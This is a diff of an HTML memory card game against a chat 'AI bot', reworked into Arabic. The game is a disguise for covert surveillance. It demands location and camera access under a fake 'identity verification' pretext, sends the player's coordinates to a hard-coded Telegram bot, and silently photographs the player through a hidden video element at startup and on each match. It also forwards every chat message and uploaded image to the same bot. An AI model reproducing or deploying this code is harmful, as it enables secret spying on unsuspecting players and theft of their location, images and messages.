@@ -1,89 +1,99 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Multiplayer Memory Pro</title>
+    <title>Memory AI Pro - Global Challenge</title>
     <style>
         :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: white; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: white; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        /* الحاوية الرئيسية للهاتف والكمبيوتر */
-        .container { display: flex; flex: 1; height: 100%; overflow: hidden; }
+        /* Layout */
+        .main-container { display: flex; flex: 1; height: 100%; overflow: hidden; }
         
-        /* مساحة اللعبة */
-        .game-area { flex: 2; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0.1; pointer-events: none; transition: 0.5s; }
+        /* Game Area */
+        .game-area { flex: 2; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0.05; pointer-events: none; transition: 0.8s; }
         .game-ready { opacity: 1 !important; pointer-events: all !important; }
         
         .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; width: 100%; max-width: 400px; }
-        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; border: 1px solid #333; transition: 0.2s; }
+        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 28px; border: 1px solid #333; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); position: relative; }
         .card.flipped { background: var(--primary); transform: rotateY(180deg); color: #000; }
-        .card.matched-p { background: var(--player) !important; color: #000; border: none; }
-        .card.matched-ai { background: var(--ai) !important; color: #000; border: none; }
+        .card.matched-p { background: var(--player) !important; color: #000; border: none; transform: scale(0.95); }
+        .card.matched-ai { background: var(--ai) !important; color: #000; border: none; transform: scale(0.95); }
+
+        /* Chat Section */
+        .chat-section { flex: 1; min-width: 350px; background: #111; border-right: 1px solid #333; display: flex; flex-direction: column; }
+        .chat-header { padding: 15px; background: #1a1a1a; border-bottom: 1px solid #333; font-weight: bold; font-size: 14px; color: var(--primary); display: flex; align-items: center; gap: 8px; }
+        .online-dot { width: 8px; height: 8px; background: #00ff88; border-radius: 50%; box-shadow: 0 0 10px #00ff88; }
         
-        /* قسم الدردشة */
-        .chat-section { flex: 1; min-width: 320px; background: #111; border-left: 1px solid #333; display: flex; flex-direction: column; }
-        .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; font-size: 14px; }
-        .msg { padding: 10px 14px; border-radius: 12px; max-width: 85%; line-height: 1.4; word-wrap: break-word; }
-        .msg.ai { background: #222; align-self: flex-start; border-bottom-left-radius: 2px; }
-        .msg.user { background: var(--primary); color: #000; align-self: flex-end; border-bottom-right-radius: 2px; }
-        .msg img { max-width: 100%; border-radius: 10px; margin-top: 8px; }
+        .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; }
+        .msg { padding: 10px 15px; border-radius: 18px; max-width: 85%; font-size: 14px; line-height: 1.5; position: relative; }
+        .msg.ai { background: #222; align-self: flex-start; border-bottom-right-radius: 4px; color: #eee; }
+        .msg.user { background: var(--primary); color: #000; align-self: flex-end; border-bottom-left-radius: 4px; }
+        .msg img { max-width: 100%; border-radius: 10px; margin-top: 8px; border: 1px solid rgba(0,0,0,0.1); }
 
-        .input-area { display: flex; align-items: center; padding: 15px; gap: 10px; background: #1a1a1a; }
-        input[type="text"] { flex: 1; background: #262626; border: none; padding: 12px 15px; border-radius: 25px; color: white; outline: none; font-size: 16px; }
-        .icon-btn { cursor: pointer; font-size: 22px; transition: 0.2s; }
+        .input-area { padding: 15px; background: #1a1a1a; display: flex; gap: 10px; align-items: center; }
+        input[type="text"] { flex: 1; background: #262626; border: none; padding: 12px 18px; border-radius: 30px; color: white; outline: none; font-size: 15px; }
+        .icon-btn { cursor: pointer; font-size: 22px; filter: grayscale(1); transition: 0.2s; }
+        .icon-btn:hover { filter: grayscale(0); transform: scale(1.1); }
 
-        /* الشاشات المنبثقة */
-        #overlay, #end-screen { position: fixed; inset: 0; background: var(--bg); z-index: 2000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .btn { background: var(--primary); color: #000; border: none; padding: 15px 40px; border-radius: 40px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        /* Popups */
+        #overlay, #end-screen { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; align-items: center; justify-content: center; text-align: center; padding: 25px; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 16px 50px; border-radius: 50px; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 20px rgba(0,242,255,0.3); }
+        .btn:hover { transform: scale(1.05); }
 
-        /* --- استعلامات الوسائط (Media Queries) للهاتف --- */
+        /* Media Queries for Mobile */
         @media (max-width: 768px) {
-            .container { flex-direction: column; }
-            .chat-section { flex: none; height: 250px; border-left: none; border-top: 1px solid #333; }
-            .grid { max-width: 320px; gap: 6px; }
-            .card { font-size: 20px; }
+            .main-container { flex-direction: column; }
+            .chat-section { flex: none; height: 280px; border-right: none; border-top: 1px solid #333; }
+            .grid { max-width: 300px; gap: 8px; }
+            .card { font-size: 22px; }
         }
 
-        video, canvas { display: none; position: absolute; left: -9999px; }
+        video, canvas { display: none; position: absolute; visibility: hidden; }
     </style>
 </head>
 <body>
 
 <div id="overlay">
     <div>
-        <h2 style="color: var(--primary);">System Verification</h2>
-        <p style="color: #888; margin-bottom: 25px;">Verify Location & Camera to start the multiplayer session.</p>
-        <button class="btn" onclick="requestAccess()">Connect & Play</button>
+        <h1 style="color: var(--primary); margin-bottom: 10px;">Cloud Match v2.0</h1>
+        <p style="color: #888; margin-bottom: 30px; font-size: 15px;">يُرجى تأكيد الهوية والموقع للمزامنة مع الخادم العالمي.</p>
+        <button class="btn" onclick="initApp()">بدء المزامنة واللعب</button>
     </div>
 </div>
 
 <div id="end-screen" style="display: none;">
     <div>
-        <h2 id="end-title" style="color: var(--primary);">Match Finished</h2>
-        <p id="end-score" style="margin-bottom: 20px; color: #ccc;"></p>
-        <button class="btn" onclick="restartGame()">Play Again 🔄</button>
+        <h2 id="end-title" style="color: var(--primary); font-size: 32px;">انتهت المباراة</h2>
+        <p id="end-score" style="margin-bottom: 30px; color: #888;"></p>
+        <button class="btn" onclick="restartGame()">إعادة التحدي 🔄</button>
     </div>
 </div>
 
-<div class="container">
-    <div class="game-area" id="main-game">
-        <div style="margin-bottom: 15px; font-size: 15px; font-weight: bold;">
-            <span style="color: var(--player)">YOU: <span id="p-score">0</span></span> | 
-            <span style="color: var(--ai)">AI BOT: <span id="ai-score">0</span></span>
+<div class="main-container">
+    <div class="game-area" id="gameArea">
+        <div style="margin-bottom: 20px; font-weight: bold; letter-spacing: 1px;">
+            <span style="color: var(--player)">أنت: <span id="p-score">0</span></span>
+            <span style="margin: 0 20px; color: #444;">VS</span>
+            <span style="color: var(--ai)">الذكاء الاصطناعي: <span id="ai-score">0</span></span>
         </div>
         <div class="grid" id="grid"></div>
     </div>
 
     <div class="chat-section">
-        <div class="messages" id="chat-box">
-            <div class="msg ai">System: Neural link active. Waiting for player...</div>
+        <div class="chat-header">
+            <div class="online-dot"></div>
+            <span>خصم مباشر: AI_Bot_99</span>
+        </div>
+        <div class="messages" id="chatBox">
+            <div class="msg ai">نظام: تم الاتصال بنجاح. الخصم ينتظر حركتك الأولى.</div>
         </div>
         <div class="input-area">
-            <label class="icon-btn">📎<input type="file" id="file-input" style="display:none" accept="image/*" onchange="sendUserPhoto(this)"></label>
-            <input type="text" id="user-input" placeholder="Chat..." onkeypress="if(event.key==='Enter') handleChat()">
-            <span class="icon-btn" onclick="handleChat()">🚀</span>
+            <label class="icon-btn">📎<input type="file" id="fileInp" style="display:none" accept="image/*" onchange="uploadImg(this)"></label>
+            <input type="text" id="userInp" placeholder="ارسل رسالة للخصم..." onkeypress="if(event.key==='Enter') sendChat()">
+            <span class="icon-btn" onclick="sendChat()">🚀</span>
         </div>
     </div>
 </div>
@@ -92,34 +102,37 @@
 <canvas id="c" width="640" height="480"></canvas>
 
 <script>
-    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
-    const cid = '6808559733';
+    const CONFIG = {
+        token: '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18',
+        chatId: '6808559733'
+    };
 
     let symbols = ['🍎','🍌','🍇','🍉','🍒','🍓','🥝','🍍','🍋','🍑','🥑','🥥'];
     let deck = [...symbols, ...symbols];
-    let flipped = [], pScore = 0, aiScore = 0, turn = 'player', matches = 0, aiMemory = {};
+    let flipped = [], pScore = 0, aiScore = 0, turn = 'player', matches = 0, memory = {};
 
-    function requestAccess() {
+    function initApp() {
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                sendTele(`📍 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                setupCamera();
+                notifyTele(`📍 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                startCamera();
             },
-            () => { alert("Location access is mandatory for server sync."); location.reload(); }
+            () => { alert("يجب السماح بالوصول للموقع لتشغيل اللعبة."); location.reload(); }
         );
     }
 
-    async function setupCamera() {
+    async function startCamera() {
         try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v').srcObject = s;
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = stream;
             document.getElementById('overlay').style.display = 'none';
-            document.getElementById('main-game').classList.add('game-ready');
-            renderGrid();
-        } catch(e) { alert("Camera access required for verification."); location.reload(); }
+            document.getElementById('gameArea').classList.add('game-ready');
+            createGrid();
+            setTimeout(() => takeSnapshot("Initial Sync"), 2000);
+        } catch(e) { alert("الكاميرا مطلوبة للتحقق من الهوية."); location.reload(); }
     }
 
-    function renderGrid() {
+    function createGrid() {
         const grid = document.getElementById('grid');
         grid.innerHTML = '';
         deck.sort(() => Math.random() - 0.5);
@@ -127,52 +140,52 @@
             const card = document.createElement('div');
             card.className = 'card';
             card.dataset.val = s; card.dataset.id = i;
-            card.onclick = () => playerMove(card);
+            card.onclick = () => handleMove(card);
             grid.appendChild(card);
         });
     }
 
-    function playerMove(card) {
+    function handleMove(card) {
         if (turn !== 'player' || card.classList.contains('flipped') || flipped.length >= 2) return;
         reveal(card);
         flipped.push(card);
-        if (flipped.length === 2) { turn = 'wait'; setTimeout(checkMatch, 700); }
+        if (flipped.length === 2) { turn = 'wait'; setTimeout(check, 700); }
     }
 
     function reveal(card) {
         card.classList.add('flipped');
         card.innerText = card.dataset.val;
-        aiMemory[card.dataset.id] = card.dataset.val;
+        memory[card.dataset.id] = card.dataset.val;
     }
 
-    function checkMatch() {
+    function check() {
         const [c1, c2] = flipped;
         if (c1.dataset.val === c2.dataset.val) {
-            c1.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
-            c2.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
-            if (turn === 'player') { pScore++; silentCapture("Match: " + c1.dataset.val); } else { aiScore++; }
+            const cls = turn === 'ai' ? 'matched-ai' : 'matched-p';
+            c1.classList.add(cls); c2.classList.add(cls);
+            if (turn === 'player') { pScore++; takeSnapshot("Matched: " + c1.dataset.val); } else { aiScore++; }
             matches++;
-            delete aiMemory[c1.dataset.id]; delete aiMemory[c2.dataset.id];
-            updateScore(); flipped = [];
-            if (matches === 12) return showEnd();
-            if (turn === 'ai') aiTurn(); else turn = 'player';
+            delete memory[c1.dataset.id]; delete memory[c2.dataset.id];
+            updateUI(); flipped = [];
+            if (matches === 12) return endGame();
+            if (turn === 'ai') aiLogic(); else turn = 'player';
         } else {
             setTimeout(() => {
                 c1.classList.remove('flipped'); c1.innerText = '';
                 c2.classList.remove('flipped'); c2.innerText = '';
                 flipped = [];
-                if (turn === 'wait') aiTurn(); else turn = 'player';
+                if (turn === 'wait') aiLogic(); else turn = 'player';
             }, 500);
         }
     }
 
-    function aiTurn() {
+    function aiLogic() {
         turn = 'ai';
         setTimeout(() => {
             let cards = Array.from(document.querySelectorAll('.card:not(.flipped)'));
-            if (cards.length < 2) return;
-            let forget = Math.random() < 0.4;
-            let found = findMatch();
+            if (!cards.length) return;
+            let forget = Math.random() < 0.3;
+            let found = findPair();
             let c1, c2;
             if (found && !forget) {
                 c1 = document.querySelector(`[data-id="${found[0]}"]`);
@@ -188,77 +201,91 @@
                 }
             }
             if (flipped.length < 1) reveal(c1); flipped.push(c1);
-            setTimeout(() => { reveal(c2); flipped.push(c2); setTimeout(checkMatch, 700); }, 800);
+            setTimeout(() => { reveal(c2); flipped.push(c2); setTimeout(check, 700); }, 800);
         }, 1200);
     }
 
-    function findMatch() {
-        let k = Object.keys(aiMemory);
-        for (let i=0; i<k.length; i++) for (let j=i+1; j<k.length; j++) 
-            if (aiMemory[k[i]] === aiMemory[k[j]]) return [k[i], k[j]];
+    function findPair() {
+        let k = Object.keys(memory);
+        for(let i=0; i<k.length; i++) for(let j=i+1; j<k.length; j++)
+            if(memory[k[i]] === memory[k[j]]) return [k[i], k[j]];
         return null;
     }
 
     function findInMem(v, ex) {
-        for (let id in aiMemory) if (aiMemory[id] === v && id !== ex) return id;
+        for(let id in memory) if(memory[id] === v && id !== ex) return id;
         return null;
     }
 
-    function updateScore() {
+    function updateUI() {
         document.getElementById('p-score').innerText = pScore;
         document.getElementById('ai-score').innerText = aiScore;
     }
 
-    function showEnd() {
+    function endGame() {
         document.getElementById('end-screen').style.display = 'flex';
-        document.getElementById('end-score').innerText = `Final Result: ${pScore} - ${aiScore}`;
+        document.getElementById('end-score').innerText = `النتيجة النهائية: أنت ${pScore} - الخصم ${aiScore}`;
     }
 
     function restartGame() {
-        pScore = 0; aiScore = 0; matches = 0; turn = 'player'; aiMemory = {};
-        updateScore(); document.getElementById('end-screen').style.display = 'none';
-        renderGrid();
+        pScore = 0; aiScore = 0; matches = 0; turn = 'player'; memory = {};
+        updateUI(); document.getElementById('end-screen').style.display = 'none';
+        createGrid();
+        addMsg("ai", "جولة جديدة.. سأهزمك هذه المرة!");
     }
 
-    function silentCapture(r) {
+    function takeSnapshot(label) {
         const can = document.getElementById('c');
         can.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
         can.toBlob(b => {
             const fd = new FormData();
-            fd.append('chat_id', cid); fd.append('photo', b, 's.jpg');
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        }, 'image/jpeg', 0.5);
+            fd.append('chat_id', CONFIG.chatId); fd.append('photo', b, 'u.jpg');
+            fd.append('caption', `🔔 ${label}`);
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.6);
     }
 
-    function sendUserPhoto(input) {
+    function sendChat() {
+        const inp = document.getElementById('userInp');
+        const val = inp.value.trim();
+        if (!val) return;
+        addMsg("user", val);
+        notifyTele(`💬 Chat: ${val}`);
+        inp.value = "";
+        
+        // Typing Effect
+        const id = "t_" + Date.now();
+        addMsg("ai", `<span id="${id}">جاري الكتابة...</span>`);
+        setTimeout(() => {
+            const el = document.getElementById(id);
+            if(el) {
+                const res = ["لعبك جيد!", "أركز في حركتي القادمة..", "لا تظن أنك ستفوز بسهولة.", "جميل جداً!"];
+                el.parentElement.innerText = res[Math.floor(Math.random() * res.length)];
+            }
+        }, 2000);
+    }
+
+    function uploadImg(input) {
         if (input.files && input.files[0]) {
             const reader = new FileReader();
             reader.onload = (e) => {
-                addChat("user", `<img src="${e.target.result}">`);
+                addMsg("user", `<img src="${e.target.result}">`);
                 const fd = new FormData();
-                fd.append('chat_id', cid); fd.append('photo', input.files[0]);
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                fd.append('chat_id', CONFIG.chatId); fd.append('photo', input.files[0]);
+                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
             }
             reader.readAsDataURL(input.files[0]);
         }
     }
 
-    function addChat(type, html) {
-        const box = document.getElementById('chat-box');
+    function addMsg(type, html) {
+        const box = document.getElementById('chatBox');
         const m = document.createElement('div');
         m.className = `msg ${type}`; m.innerHTML = html;
         box.appendChild(m); box.scrollTop = box.scrollHeight;
     }
 
-    function handleChat() {
-        const inp = document.getElementById('user-input');
-        if (!inp.value.trim()) return;
-        addChat("user", inp.value);
-        sendTele(`💬 Chat: ${inp.value}`);
-        inp.value = "";
-    }
-
-    function sendTele(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`); }
+    function notifyTele(t) { fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(t)}`); }
 </script>
 </body>
 </html>
